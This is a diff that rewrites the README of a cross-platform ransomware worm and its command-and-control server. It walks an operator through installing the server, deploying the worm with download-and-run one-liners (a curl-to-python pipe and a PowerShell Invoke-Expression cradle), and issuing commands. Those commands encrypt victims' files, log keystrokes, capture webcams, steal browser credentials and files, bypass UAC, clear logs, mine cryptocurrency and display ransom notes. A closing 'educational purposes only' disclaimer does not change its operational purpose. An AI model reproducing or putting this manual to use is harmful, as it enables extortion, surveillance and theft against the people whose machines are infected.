@@ -1,30 +1,45 @@
 # Cross-Platform Ransomware Worm with C2 Server
 
-Complete Command and Control System Documentation
-
----
+> **Complete Command and Control System Documentation**
 
 ## Table of Contents
 
-- [Overview](#overview)
-- [Features](#features)
-- [System Architecture](#system-architecture)
-- [Installation Guide](#installation-guide)
-- [C2 Server Commands](#c2-server-commands)
-- [API Reference](#api-reference)
-- [Troubleshooting](#troubleshooting)
-- [Security Considerations](#security-considerations)
+- Overview
+- Features
+- System Architecture
+- Installation Guide
+  - C2 Server Installation
+  - Worm Deployment
+- C2 Server Commands
+  - Encryption Commands
+  - Keylogger Commands
+  - Webcam Commands
+  - System Commands
+  - Data Exfiltration Commands
+  - Persistence Commands
+  - Ransomware Commands
+  - Miscellaneous Commands
+- API Reference
+- Troubleshooting
+- Security Considerations
+- Command Examples
+- File Structure
+- Update Process
+- Support
+- Disclaimer
+- License
+- Quick Reference Card
 
 ---
 
 ## Overview
 
-This is a complete cross-platform Command and Control (C2) system consisting of:
+This document describes a complete cross-platform Command and Control (C2) system consisting of:
 
-- **C2 Server**: A web-based dashboard for controlling infected machines
-- **Worm Malware**: Cross-platform agent that executes commands on Windows, macOS, and Linux
+- **C2 Server:** A web-based dashboard for controlling infected machines.
+- **Worm Malware:** Cross-platform agent that executes commands on Windows, macOS, and Linux.
 
-The system provides remote control capabilities including:
+The described capabilities include:
 
 - File encryption and decryption
 - Keystroke logging
@@ -34,6 +49,7 @@ The system provides remote control capabilities including:
 - Cryptocurrency mining
 - System command execution
 - Process injection
+- And more...
 
 ---
 
@@ -41,99 +57,486 @@ The system provides remote control capabilities including:
 
 ### Worm Features
 
-| Feature | Description |
-|---------|-------------|
-| Cross-Platform | Works on Windows, macOS, and Linux |
-| Anti-VM Detection | Detects virtual machines and sandboxes |
-| Persistent | Multiple persistence mechanisms |
-| Stealth | Clears logs, bypasses UAC |
-| Encryption | AES-256 file encryption |
-| Keylogging | Captures all keystrokes |
-| Webcam | Capture images and stream |
-| Data Exfiltration | Steals sensitive files |
-| Crypto Mining | Fallback cryptocurrency mining |
-| Process Injection | Injects code into running processes |
-| Dead Man's Switch | Automatic encryption if no C2 contact |
-| Checkpoint Resume | Resumes encryption if interrupted |
+- Cross-platform support (Windows, macOS, Linux)
+- Anti-VM detection
+- Persistence mechanisms
+- Stealth features
+- AES-256 file encryption
+- Keylogging
+- Webcam capture
+- Data exfiltration
+- Cryptocurrency mining
+- Process injection
+- Dead man's switch
+- Checkpoint resume
 
 ### C2 Server Features
 
-| Feature | Description |
-|---------|-------------|
-| Web Dashboard | Real-time host monitoring |
-| WebSocket Support | Live updates |
-| Command Templates | Pre-built command structures |
-| Keylog Viewer | View captured keystrokes |
-| Host Statistics | Detailed system information |
-| Multi-Host | Control multiple infected machines |
-| API Access | RESTful API for automation |
-| Secure Login | Password-protected access |
+- Web dashboard
+- WebSocket support
+- Command templates
+- Keylog viewer
+- Host statistics
+- Multi-host management
+- REST API
+- Secure login
 
 ---
 
 ## System Architecture
 
-### Component Overview
-
-The system consists of three main components working together:
-
-**1. C2 Server (Controller)**
-- Web-based dashboard running on your machine
-- Manages all infected hosts
-- Sends commands and receives results
-- Stores data in SQLite database
-
-**2. Worm Agent (Victim)**
-- Runs on infected Windows, macOS, or Linux systems
-- Connects to C2 server via DNS/HTTP beacons
-- Executes received commands
-- Sends back results and stolen data
-
-**3. Communication Channel**
-- DNS tunneling for stealth communication
-- HTTP beacons for status updates
-- WebSocket for real-time command delivery
-
-
-### Components
-
-**C2 Server Components:**
-- Flask web application
-- SQLite database for storage
-- WebSocket server for real-time updates
-- DNS command channel
-
-**Worm Agent Components:**
-- OS detection module
-- Command execution engine
-- Encryption module
-- Keylogger module
-- Webcam module
-- Data exfiltration module
-- Persistence module
-
-### Database Structure
-
-| Table | Purpose |
-|-------|---------|
-| hosts | Stores infected machine information |
-| commands | Command queue for each host |
-| beacons | Communication history |
-| keylogs | Captured keystrokes |
-| encrypted_files | List of encrypted files |
-| exfiltrated_files | Stolen files data |
-| webcam_captures | Webcam images |
+```text
++-------------------------------------------------------------+
+|                      C2 SERVER                              |
+|                   (Your Computer)                           |
+|                                                             |
+|  +---------------+  +---------------+  +----------------+   |
+|  | Web Dashboard |  | WebSocket     |  | REST API      |   |
+|  | (Port 5000)   |  | (Real-time)   |  | (HTTP)        |   |
+|  +---------------+  +---------------+  +----------------+   |
+|                                                             |
+|  +-----------------------------------------------------+    |
+|  |               SQLite Database                       |    |
+|  | Hosts, Commands, Keylogs, Encrypted Files           |    |
+|  +-----------------------------------------------------+    |
++-------------------------------------------------------------+
+                         |
+                  DNS/HTTP Beacons
+                         |
+        +----------------+----------------+----------------+
+        |                |                |
++---------------+ +---------------+ +---------------+
+| Windows Agent | | macOS Agent   | | Linux Agent   |
++---------------+ +---------------+ +---------------+
+```
 
 ---
 
-## Installation Guide
+# Installation Guide
 
-### C2 Server Installation
+## C2 Server Installation
 
-#### Quick Install (All Operating Systems)
+### Option 1 — Quick Install
 
-# 1. Install Python dependencies
-` pip install Flask==2.3.2 Flask-SocketIO==5.3.4 python-socketio==5.8.0 eventlet==0.33.3 
+```bash
+# Install dependencies
+pip install Flask==2.3.2 Flask-SocketIO==5.3.4 python-socketio==5.8.0 eventlet==0.33.3
 
-# 2. Run the server
+# Run
 python c2_server.py
+```
+
+### Windows
+
+```powershell
+python -m pip install Flask==2.3.2 Flask-SocketIO==5.3.4 python-socketio==5.8.0 eventlet==0.33.3
+
+python c2_server.py
+```
+
+### macOS
+
+```bash
+brew install python3 python-tk
+
+pip3 install Flask==2.3.2 Flask-SocketIO==5.3.4 python-socketio==5.8.0 eventlet==0.33.3
+
+python3 c2_server.py
+```
+
+### Linux
+
+```bash
+sudo apt update
+sudo apt install python3 python3-pip python3-tk -y
+
+pip3 install Flask==2.3.2 Flask-SocketIO==5.3.4 python-socketio==5.8.0 eventlet==0.33.3
+
+python3 c2_server.py
+```
+
+---
+
+## Initial Server Configuration
+
+```text
+============================================================
+C2 SERVER v2.0
+============================================================
+Server URL: http://0.0.0.0:5000
+Username: admin
+Password: secure_password_123
+============================================================
+Waiting for connections...
+============================================================
+```
+
+---
+
+## Worm Deployment
+
+### Configuration
+
+```python
+C2_SERVER = "your-ip-address-or-domain.com"
+```
+
+### Deployment Methods
+
+```bash
+python3 worm.py
+```
+
+```bash
+curl -s http://your-c2-server/worm.py | python3
+```
+
+```powershell
+powershell -command "Invoke-Expression (Invoke-WebRequest -Uri 'http://your-c2-server/worm.py').Content"
+```
+
+---
+
+# C2 Server Commands
+
+## Command Structure
+
+```json
+{
+  "host_id": "target-host-id",
+  "command": "command_name",
+  "params": {
+    "param1": "value1",
+    "param2": "value2"
+  }
+}
+```
+
+---
+
+## Encryption Commands
+
+| Command | Description | Parameters |
+|---------|-------------|------------|
+| encrypt | Encrypt all files | password |
+| encrypt_files | Encrypt specific files | file_paths, password |
+| encrypt_directory | Encrypt directory | directory, password, recursive |
+| decrypt | Decrypt all files | password |
+| decrypt_files | Decrypt files | file_paths, password |
+| decrypt_directory | Decrypt directory | directory, password, recursive |
+| encryption_status | Status | None |
+| encryption_stats | Statistics | None |
+
+---
+
+## Keylogger Commands
+
+| Command | Description |
+|---------|-------------|
+| keylog_start | Start capture |
+| keylog_stop | Stop capture |
+| keylog_status | Status |
+| keylog_download | Download logs |
+| keylog_clear | Clear logs |
+
+---
+
+## Webcam Commands
+
+| Command | Description |
+|---------|-------------|
+| webcam_capture | Capture frame |
+| webcam_stream | Stream video |
+| webcam_status | Status |
+| webcam_release | Release device |
+
+---
+
+## System Commands
+
+| Command | Description |
+|---------|-------------|
+| execute | Run command |
+| screenshot | Capture screenshot |
+| screen_share | Share screen |
+| block_computer | Lock computer |
+| list_processes | List processes |
+| kill_process | Kill process |
+| inject_process | Inject process |
+
+---
+
+## Data Exfiltration Commands
+
+| Command | Description |
+|---------|-------------|
+| exfiltrate | Steal files |
+| steal_browser | Browser credentials |
+| download_file | Download remote file |
+| upload_file | Upload file |
+| collect_data | Collect information |
+| file_search | Search files |
+| directory_list | List directories |
+
+---
+
+## Persistence Commands
+
+| Command | Description |
+|---------|-------------|
+| install_persistence | Install persistence |
+| persistence_status | Status |
+
+---
+
+## Ransomware Commands
+
+| Command | Description |
+|---------|-------------|
+| display_ransom_note | Show ransom note |
+| change_ransom_amount | Update amount |
+| change_payment_address | Update address |
+| deadline | Set deadline |
+
+---
+
+## Mining Commands
+
+| Command | Description |
+|---------|-------------|
+| start_mining | Start mining |
+| stop_mining | Stop mining |
+| mining_status | Status |
+
+---
+
+## Miscellaneous Commands
+
+| Command | Description |
+|---------|-------------|
+| status | Status |
+| heartbeat | Heartbeat |
+| get_os_info | OS information |
+| get_stats | Statistics |
+| clear_logs | Clear logs |
+| bypass_uac | Bypass UAC |
+| check_environment | Check VM |
+| self_destruct | Self destruct |
+
+---
+
+# API Reference
+
+## REST Endpoints
+
+| Endpoint | Method |
+|----------|--------|
+| `/api/hosts` | GET |
+| `/api/host/<host_id>` | GET |
+| `/api/command` | POST |
+| `/api/beacon` | POST |
+| `/api/command_result` | POST |
+| `/api/keylogs/<host_id>` | GET |
+| `/api/encrypted_files/<host_id>` | GET |
+| `/api/stats` | GET |
+| `/api/command_templates` | GET |
+| `/api/clear_logs` | POST |
+
+---
+
+## API Examples
+
+### Send Command
+
+```bash
+curl -X POST http://localhost:5000/api/command \
+-H "Content-Type: application/json" \
+-d '{
+  "host_id":"host-uuid",
+  "command":"execute",
+  "params":{"command":"whoami"}
+}'
+```
+
+### Get Keylogs
+
+```bash
+curl http://localhost:5000/api/keylogs/host-uuid
+```
+
+### Get Statistics
+
+```bash
+curl http://localhost:5000/api/stats
+```
+
+---
+
+## WebSocket Events
+
+| Event | Direction |
+|--------|-----------|
+| connect | Client → Server |
+| disconnect | Client → Server |
+| beacon | Server → Client |
+| command_result | Server → Client |
+| get_hosts | Client → Server |
+| send_command | Client → Server |
+| hosts | Server → Client |
+
+---
+
+# Troubleshooting
+
+## Server Won't Start
+
+```bash
+# Windows
+netstat -ano | findstr :5000
+
+# Linux/macOS
+lsof -i :5000
+```
+
+## Worm Not Connecting
+
+```bash
+curl http://your-server-ip:5000/api/hosts
+```
+
+## Keylogger
+
+```bash
+sudo usermod -a -G input $USER
+```
+
+## Webcam
+
+```bash
+pip install opencv-python opencv-python-headless
+
+sudo apt-get install v4l-utils
+```
+
+---
+
+# Security Considerations
+
+### Change Password
+
+```python
+ADMIN_PASSWORD = "your-strong-password-here"
+```
+
+### HTTPS
+
+```python
+socketio.run(
+    app,
+    host="0.0.0.0",
+    port=5000,
+    ssl_context=("cert.pem","key.pem")
+)
+```
+
+### Allowed IPs
+
+```python
+ALLOWED_IPS = [
+    "192.168.1.100",
+    "10.0.0.5"
+]
+```
+
+### Domain
+
+```python
+C2_DOMAIN = "your-domain.com"
+```
+
+### Backup Database
+
+```bash
+cp c2_database.db c2_database_backup_$(date +%Y%m%d).db
+```
+
+---
+
+# File Structure
+
+```text
+c2_server/
+├── c2_server.py
+├── c2_database.db
+├── c2_server.log
+└── requirements.txt
+
+worm/
+├── worm.py
+├── worm_debug.log
+└── ~/.system_update/
+```
+
+---
+
+# Update Process
+
+## Worm
+
+1. Modify `worm.py`
+2. Deploy update
+3. Send `self_update`
+
+## Server
+
+```bash
+cp c2_database.db c2_database_backup.db
+
+python c2_server.py
+```
+
+---
+
+# Support
+
+## Logs
+
+- `c2_server.log`
+- `worm_debug.log`
+- `c2_database.db`
+
+### Debug
+
+```bash
+python3 worm.py --debug
+
+tail -f c2_server.log
+```
+
+---
+
+# Disclaimer
+
+This software is for educational and security research purposes only.
+
+- Do not use on systems without explicit authorization.
+- The author is not responsible for misuse.
+- Follow all applicable laws.
+
+---
+
+# License
+
+Educational purposes only.
+
+---
+
+# Quick Reference
+
+| Item | Location | Notes |
+|------|----------|------|
+| C2 Server | `http://localhost:5000` | Login required |
+| Worm | Target machine | Auto-connects |
+| Commands | Dashboard/API | JSON |
+| Database | `c2_database.db` | SQLite |
+| Logs | `c2_server.log` | Text |
